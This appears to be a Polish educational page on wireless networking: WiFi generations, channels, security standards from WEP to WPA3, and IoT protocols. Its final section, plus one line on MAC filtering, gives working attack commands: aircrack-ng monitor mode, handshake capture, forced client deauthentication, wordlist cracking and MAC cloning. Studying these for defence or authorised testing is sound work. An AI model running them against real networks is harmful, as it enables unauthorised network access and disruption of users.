Kluczowe innowacje per generacja

WiFi 4 (802.11n, 2009)

  • MIMO (Multiple Input Multiple Output) - kilka anten
  • Channel bonding 40 MHz
  • Frame aggregation

WiFi 5 (802.11ac, 2013)

  • 5 GHz only
  • Channel bonding 80 i 160 MHz
  • MU-MIMO downlink (multi-user)
  • 256-QAM modulacja

WiFi 6 (802.11ax, 2019)

  • OFDMA (Orthogonal Frequency-Division Multiple Access) - subdivision kanalow dla wielu klientow rownoczesnie
  • MU-MIMO uplink + downlink
  • 1024-QAM
  • BSS Coloring - mniejsza interferencja w gestych srodowiskach
  • Target Wake Time (TWT) - oszczedza baterii dla IoT
  • WPA3 wymagane

WiFi 6E (2021)

  • Dodano pasmo 6 GHz (5925-7125 MHz)
  • Az do 14 nowych kanalow 80 MHz lub 7 kanalow 160 MHz
  • Czyste pasmo - mniej legacy interferencji

WiFi 7 (802.11be, 2024) - standard 2026

  • 320 MHz channel width (w 6 GHz)
  • 4096-QAM (4K-QAM)
  • MLO (Multi-Link Operation) - rownoczesne uzycie 2.4 + 5 + 6 GHz
  • Maks. 46 Gbps teoretycznie
  • Lower latency dla XR/VR/cloud gaming

Pasmo 2.4 GHz ma 13-14 kanalow w EU/PL (1-13), kazdy 22 MHz szeroki, ale rozstawione co 5 MHz. Tylko 1, 6, 11 sa non-overlapping (niezachodzace).

Kanaly 5 GHz

Wiecej miejsca - 25 kanalow 20 MHz (36 do 165). Niektore wymagaja DFS (Dynamic Frequency Selection) - musi unikac kolizji z radarami (52-144).

Bezpieczenstwo WiFi

WEP - DEPRECATED

Wired Equivalent Privacy - pierwszy standard z 1997. Zlamany w ciagu kilku sekund od 2001. RC4 + slabe IV. NIE UZYWAJ.

WPA - DEPRECATED

WiFi Protected Access (2003). TKIP cipher. Zastapione przez WPA2 w 2004.

WPA2

WiFi Protected Access 2 (2004). AES-CCMP cipher. Standard przez 14 lat. Atak KRACK (2017) wykryl podatnosc, ale w wiekszosci zalatany.

WPA3 - aktualny standard

Od 2018, wymagany w certyfikacji WiFi 6 (2019+). Glowne zmiany:

  • SAE (Simultaneous Authentication of Equals) - zastapuje 4-way handshake, odporne na offline brute force
  • Forward Secrecy - przeszle sesje pozostaja bezpieczne nawet jesli haslo wycieknie
  • Protected Management Frames - wymagane (zapobiega deauth attacks)
  • 192-bit security mode dla enterprise
  • WPA3-Enterprise z optional 192-bit suite

SSID i MAC filtering - mity

Niektorzy myslac ze ukrycie SSID lub MAC filtering daje bezpieczenstwo. To security by obscurity - latwe do obejscia.

  • Hidden SSID - klienci wciaz wysylaja w probe requests, sniffer to widzi w sekundzie. Jedyny efekt: utrudnia laczenie sie legitymnych klientow.
  • MAC filtering - MAC adres jest wysylany niezaszyfrowany. Atakujacy moze podsluchac i sklonowac MAC przez ip link set eth0 address ...

Smart home protocols

  • Zigbee - 2.4 GHz, mesh, niski pobor (czujniki, oswietlenie). Producenci: Philips Hue, IKEA Tradfri, Aqara, SmartThings. Wymaga hub.
  • Z-Wave - 868 MHz (EU), nie koliduje z WiFi/BT, lepszy zasieg w domu, ale drozszy
  • Thread - IPv6 mesh, 2.4 GHz, otwarty standard. Apple HomeKit, Google Home, Nanoleaf wspieraja
  • Matter - protokol unifikujacy z 2022, dziala nad Thread/WiFi/Ethernet. W 2026 obowiazujacy standard smart home

LoRaWAN - Long Range IoT

868 MHz (EU) / 915 MHz (US). Bardzo dlugi zasieg (do 15 km poza miastem) ale bardzo niski bitrate (0.3-50 kbps). Czujniki z bateriami na 5-10 lat. Zastosowania: smart city, rolnictwo, monitoring.

NFC i RFID

  • NFC (Near Field Communication) - 13.56 MHz, do 10 cm. Apple Pay, Google Pay, karty zblizeniowe
  • RFID - rozne czestotliwosci, identyfikacja produktow, kontrola dostepu, paszporty biometryczne

WiFi monitoring i hacking tools

# Prerequisty - karta z monitor mode (ALFA AWUS036ACH, Panda PAU09):
sudo apt install aircrack-ng kismet wireshark

# Monitor mode:
sudo airmon-ng start wlan0
# Tworzy interfejs wlan0mon

# Skanowanie sieci:
sudo airodump-ng wlan0mon
# Pokazuje BSSID, ESSID, kanal, encryption, RSSI klientow

# Capturowanie handshake na konkretnym AP:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Wymus deauth (klient sie reconnecta i zobaczymy handshake):
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack handshake (slownik):
aircrack-ng -w wordlist.txt capture-01.cap

# Kismet - bardziej zaawansowany:
sudo kismet -c wlan0mon

# Wyloguj monitor mode:
sudo airmon-ng stop wlan0mon

# Linux - skan dostepnych sieci:
nmcli device wifi list
iwlist wlan0 scan
sudo iw dev wlan0 scan
